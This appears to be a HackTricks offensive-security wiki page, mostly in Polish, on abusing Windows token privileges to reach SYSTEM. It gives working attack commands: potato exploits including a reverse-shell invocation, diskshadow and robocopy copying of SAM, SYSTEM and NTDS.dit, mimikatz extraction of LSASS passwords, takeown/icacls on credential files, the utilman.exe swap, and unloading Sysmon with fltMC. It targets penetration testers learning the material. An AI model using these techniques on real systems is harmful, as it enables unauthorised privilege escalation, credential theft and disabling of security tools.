# Abuse of Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Jeśli **nie wiesz, czym są Windows Access Tokens**, przeczytaj tę stronę przed kontynuowaniem:


{{#ref}}
access-tokens.md
{{#endref}}

**Możliwe, że uda ci się podnieść uprawnienia, nadużywając tokenów, które już masz**

### SeImpersonatePrivilege

To uprawnienie posiadane przez każdy proces pozwala na impersonation (ale nie tworzenie) dowolnego tokena, pod warunkiem że można uzyskać do niego uchwyt. Uprzywilejowany token można zdobyć z usługi Windows (DCOM), wymuszając na niej wykonanie uwierzytelnienia NTLM wobec exploita, a następnie umożliwiając wykonanie procesu z uprawnieniami SYSTEM. Tę podatność można wykorzystać za pomocą różnych narzędzi, takich jak [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (które wymaga wyłączonego winrm), [SweetPotato](https://github.com/CCob/SweetPotato) oraz [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: na Windows 10 1809+/Server 2019+, preferuj **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** lub **PrintSpoofer**, zależnie od tego, jaka powierzchnia RPC/COM jest nadal osiągalna.
- Jeśli skompromitowałeś usługę działającą jako **`LOCAL SERVICE`** lub **`NETWORK SERVICE`** i `whoami /priv` pokazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, najpierw odzyskaj **default privilege set** tego konta (na przykład za pomocą **FullPowers**), a potem ponownie wypróbuj rodzinę potato.
- Niektóre nowsze fork'i są wygodniejsze dla operatora niż oryginalne narzędzia. Na przykład **SigmaPotato** dodaje reflection/in-memory execution i nowoczesną zgodność z Windows, a **PrintNotifyPotato** nadużywa usługi COM PrintNotify i często jest przydatne, gdy klasyczna ścieżka Spooler jest wyłączona.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Jest bardzo podobne do **SeImpersonatePrivilege**, użyje **tej samej metody** do uzyskania uprzywilejowanego tokenu.\
Następnie to uprawnienie pozwala **przypisać primary token** do nowego/zawieszonego procesu. Z uprzywilejowanym impersonation token możesz wyprowadzić primary token (DuplicateTokenEx).\
Za pomocą tokenu możesz utworzyć **nowy proces** przy użyciu 'CreateProcessAsUser' albo utworzyć proces w stanie zawieszenia i **ustawić token** (ogólnie nie możesz modyfikować primary token działającego procesu).

### SeTcbPrivilege

Jeśli masz włączony ten token, możesz użyć **KERB_S4U_LOGON**, aby uzyskać **impersonation token** dla dowolnego innego użytkownika bez znajomości poświadczeń, **dodać dowolną grupę** (admins) do tokenu, ustawić **integrity level** tokenu na "**medium**" i przypisać ten token do **current thread** (SetThreadToken).

### SeBackupPrivilege

To uprawnienie powoduje, że system **przyznaje pełny dostęp do odczytu** do dowolnego pliku (ograniczony do operacji odczytu). Jest wykorzystywane do **odczytu hashy haseł lokalnych kont Administrator** z rejestru, po czym można użyć narzędzi takich jak "**psexec**" lub "**wmiexec**" z hashem (technika Pass-the-Hash). Jednak ta technika zawodzi w dwóch przypadkach: gdy konto Local Administrator jest wyłączone albo gdy obowiązuje polityka, która usuwa uprawnienia administracyjne lokalnym Administratorom łączącym się zdalnie.\
W praktyce najbardziej niezawodnym wbudowanym workflow jest zwykle **VSS + `robocopy /b`**: utwórz/ujawnij shadow copy, a następnie skopiuj `SAM`/`SYSTEM` lub `NTDS.dit` w **backup mode**, co omija file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Uprawnienie do **zapisu** do dowolnego pliku systemowego, niezależnie od Access Control List (ACL) pliku, jest zapewniane przez to uprawnienie. Otwiera ono wiele możliwości eskalacji, w tym możliwość **modyfikowania usług**, wykonywania DLL Hijacking oraz ustawiania **debuggers** przez Image File Execution Options, a także wielu innych technik.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege to potężne uprawnienie, szczególnie przydatne, gdy użytkownik ma możliwość impersonate tokenów, ale także w przypadku braku SeImpersonatePrivilege. Ta możliwość opiera się na zdolności impersonate tokenu reprezentującego tego samego użytkownika i którego integrity level nie przekracza integrity level bieżącego procesu.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Możliwe jest wykorzystanie SeCreateTokenPrivilege do EoP przez impersonate tokenów w określonych warunkach.
- **Conditions for Token Impersonation:** Udane impersonate wymaga, aby docelowy token należał do tego samego użytkownika i miał integrity level mniejszy lub równy integrity level procesu próbującego impersonate.
- **Creation and Modification of Impersonation Tokens:** Użytkownicy mogą utworzyć impersonation token i ulepszyć go przez dodanie SID (Security Identifier) uprzywilejowanej grupy.

### SeLoadDriverPrivilege

To uprawnienie pozwala **ładować i usuwać device drivers** przez utworzenie wpisu w rejestrze z określonymi wartościami `ImagePath` i `Type`. Ponieważ bezpośredni zapis do `HKLM` (HKEY_LOCAL_MACHINE) jest ograniczony, należy zamiast tego użyć `HKCU` (HKEY_CURRENT_USER). Jednak aby `HKCU` było rozpoznawane przez kernel do konfiguracji drivera, trzeba zastosować konkretną ścieżkę.

Nowoczesne użycie ofensywne to zwykle **BYOVD** (bring your own vulnerable driver): załaduj **podpisany, ale podatny** kernel driver, a następnie użyj jego IOCTLs, aby wyłączyć protections lub przejść do kernel code execution. Pamiętaj, że na nowszych buildach Windows 11/Server **Microsoft vulnerable driver blocklist** i/lub **HVCI/Memory Integrity** często psują starsze publiczne łańcuchy, więc klasyczne przykłady w stylu `szkg64.sys` nie są już uniwersalnie niezawodne.

Ta ścieżka to `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` to Relative Identifier bieżącego użytkownika. Wewnątrz `HKCU` cała ta ścieżka musi zostać utworzona, a dwie wartości muszą zostać ustawione:

- `ImagePath`, czyli ścieżka do binarki, która ma zostać uruchomiona
- `Type`, z wartością `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Uzyskaj dostęp do `HKCU` zamiast `HKLM` z powodu ograniczonego dostępu zapisu.
2. Utwórz ścieżkę `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` wewnątrz `HKCU`, gdzie `<RID>` reprezentuje Relative Identifier bieżącego użytkownika.
3. Ustaw `ImagePath` na ścieżkę uruchomienia binarki.
4. Przypisz `Type` jako `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Więcej sposobów na nadużycie tego privilege w [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

To jest podobne do **SeRestorePrivilege**. Jego główna funkcja pozwala procesowi **przejąć ownership obiektu**, omijając wymóg jawnego discretionary access poprzez nadanie WRITE_OWNER access rights. Proces polega najpierw na uzyskaniu ownership zamierzonego registry key do celów zapisu, a następnie na zmianie DACL, aby włączyć operacje zapisu.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

To uprawnienie pozwala na **debugowanie innych procesów**, w tym na odczyt i zapis w pamięci. Z tym uprawnieniem można używać różnych strategii memory injection, które potrafią omijać większość antivirus i host intrusion prevention solutions.

Na nowoczesnym Windows pamiętaj, że `SeDebugPrivilege` zwykle wystarcza do otwarcia **niechronionych procesów SYSTEM** i zduplikowania ich tokenów, ale **nie** gwarantuje, że możesz ingerować w **LSASS**. Jeśli **RunAsPPL / LSA Protection** jest włączone, niechronione procesy nie mogą czytać ani wstrzykiwać do LSASS, nawet jeśli `SeDebugPrivilege` jest obecne. W takim przypadku ukradnij token z innego procesu SYSTEM bez PPL albo połącz to z obejściem PPL/BYOVD zamiast zakładać, że `procdump` zadziała. Pełny przykład kopiowania tokenu z użyciem `SeDebugPrivilege` + `SeImpersonatePrivilege` znajdziesz na [tej stronie](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Możesz użyć [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) z [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), aby **zebrać pamięć procesu**. W szczególności dotyczy to procesu **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, który odpowiada za przechowywanie poświadczeń użytkownika po pomyślnym zalogowaniu do systemu.

Następnie możesz załadować ten dump w mimikatz, aby uzyskać hasła:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Jeśli chcesz uzyskać shell `NT SYSTEM`, możesz użyć:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

To uprawnienie (Perform volume maintenance tasks) pozwala otwierać surowe uchwyty urządzeń woluminu (np., \\.\C:) do bezpośredniego I/O dysku, omijając NTFS ACLs. Dzięki temu można kopiować bajty dowolnego pliku na woluminie, odczytując leżące pod spodem bloki, co umożliwia arbitralny odczyt plików zawierających wrażliwe dane (np. machine private keys w %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS przez VSS). Jest to szczególnie istotne na serwerach CA, gdzie wykradzenie CA private key umożliwia sfałszowanie Golden Certificate, aby podszyć się pod dowolny principal.

Zobacz szczegółowe techniki i mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**Tokeny**, które pojawiają się jako Disabled, zwykle można włączyć, więc często można nadużyć zarówno uprawnień _Enabled_, jak i _Disabled_.

### Włącz wszystkie tokeny

Jeśli masz wyłączone uprawnienia, możesz użyć skryptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), aby włączyć wszystkie tokeny:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Pełna ściągawka privilege tokens at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), podsumowanie poniżej będzie zawierać tylko bezpośrednie sposoby wykorzystania privilege do uzyskania sesji admina lub odczytu wrażliwych plików.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Dziękuję [Aurélien Chalot](https://twitter.com/Defte_) za update. Postaram się wkrótce przeformułować to na coś bardziej receptowego.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Odczytuj wrażliwe pliki za pomocą `robocopy /b` albo dedykowanych helperów kopiujących obsługujących SeBackup.                                                                                                                                                                                                                                                                 | <p>- Świetne do `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a czasem `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` jest wygodne, ale dedykowane cmdlety/API dla SeBackup są często bardziej elastyczne przy zablokowanych/otwartych plikach.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Utwórz dowolny token, w tym z lokalnymi prawami admina, za pomocą `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Zduplikuj token SYSTEM **non-PPL** albo zrzucaj pamięć z procesu niechronionego.                                                                                                                                                                                                                                                                 | <p>LSASS dumping jest zwykle blokowane, jeśli RunAsPPL/LSA Protection jest włączone.</p><p>Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Użyj rodziny **Potato** / impersonation przez named pipe, aby uruchomić SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Najpraktyczniejsze z kont usługowych, takich jak IIS APPPOOL, MSSQL, scheduled tasks, albo dowolnego kontekstu, który już posiada `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Załaduj podpisany, ale podatny sterownik kernelowy (BYOVD)<br>2. Użyj IOCTLi sterownika, aby uzyskać kernel R/W, wyłączyć narzędzia bezpieczeństwa albo podnieść uprawnienia do SYSTEM<br><br>Alternatywnie, privilege może być użyte do卸ładowania sterowników związanych z bezpieczeństwem za pomocą wbudowanej komendy <code>fltMC</code>, np. <code>fltMC sysmondrv</code></p>                     | <p>Starsze publiczne sterowniki, takie jak <code>szkg64.sys</code>, są coraz częściej blokowane na nowoczesnym Windows przez vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Uruchom PowerShell/ISE z dostępnym privilege SeRestore.<br>2. Włącz privilege za pomocą <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Zmień nazwę utilman.exe na utilman.old<br>4. Zmień nazwę cmd.exe na utilman.exe<br>5. Zablokuj konsolę i naciśnij Win+U</p> | <p>Atak może zostać wykryty przez niektóre oprogramowanie AV.</p><p>Metoda alternatywna opiera się na podmienianiu binarek usług przechowywanych w "Program Files" przy użyciu tego samego privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Zmień nazwę cmd.exe na utilman.exe<br>4. Zablokuj konsolę i naciśnij Win+U</p>                                                                                                                                       | <p>Atak może zostać wykryty przez niektóre oprogramowanie AV.</p><p>Metoda alternatywna opiera się na podmienianiu binarek usług przechowywanych w "Program Files" przy użyciu tego samego privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuluj tokenami tak, aby zawierały lokalne prawa admina. Może wymagać SeImpersonate.</p><p>Do potwierdzenia.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
